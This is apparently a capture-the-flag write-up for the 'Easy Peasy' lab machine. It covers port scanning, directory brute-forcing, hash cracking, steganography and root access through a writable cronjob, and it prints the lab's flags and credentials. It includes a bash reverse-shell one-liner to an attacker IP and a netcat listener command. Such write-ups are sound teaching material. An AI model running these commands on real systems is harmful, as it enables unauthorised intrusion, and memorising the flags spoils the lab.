## Easy Peasy 

> David 20th April 2022

--------------------------

# Ports Open
10.10.217.195

```
nmap -sVC 10.10.217.195 -oN nmap/initial

80, 6498, 65524
```

# Find the first flag with gobuster
```
gobuster dir -u http://10.10.217.195/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

Found hidden/whatever/

http://10.10.217.195/hidden/whatever/

After checking source "ZmxhZ3tmMXJzN19mbDRnfQ==" this was found decoded with base64 it is flag{f1rs7_fl4g}
```

# Find the second flag

>Check the other open ports 


10.10.217.195:65524/robots.txt

gives us a hash in the user agent as Allow.

```
a18672860d0510e5ab6699730763b250
```
https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250 I used md5hashing to crack this hash after failing with John/crackstation

flag{1m_s3c0nd_fl4g}

# Find the third flag

10.10.217.195:65524 shows the third flag in the website 

# Hidden Directory

After checking the source code of the apache website we find a hash.

<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p> Encoded with base62
```
/n0th1ng3ls3m4tt3r
```

# Crack the hash for the password

After checking source for /n0th1ng3ls3m4tt3r. You are greeted with another hash.
encoded with GOST.
```
john --wordlist=/tmp/easypeasy.txt --format=gost 4john.txt 
```
`mypasswordforthatjob`

# What is the password for SSH 
After THM hints about hiding something in the image i checked for hidden data in the jpg.

Using `steghide extract -sf binarycodepixabay.jpg` i got this.

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001 

[iconvertedmypasswordtobinary]
```

# User Flag

ssh boring@$IP -p 6498
passphrase: iconvertedmypasswordtobinary

cat user.txt
`flag{n0wits33msn0rm4l}`

# Priv Esc with CRONJOBS

cat /etc/crontab

```
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
.mysecretcronjob.sh is writable.

after adding a reverse shell script in. `0<&196;exec 196<>/dev/tcp/10.8.72.90/4444; sh <&196 >&196 2>&196`

i set up a netcat listener with nc -lnvp 4444

This gave me access to the machine as root.

cd /root
ls -la
```
ls -la                                                                                                              
total 40                                                                                                            
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
cat .root.txt     
flag{63a9f0ea7bb98050796b649e85481845}
```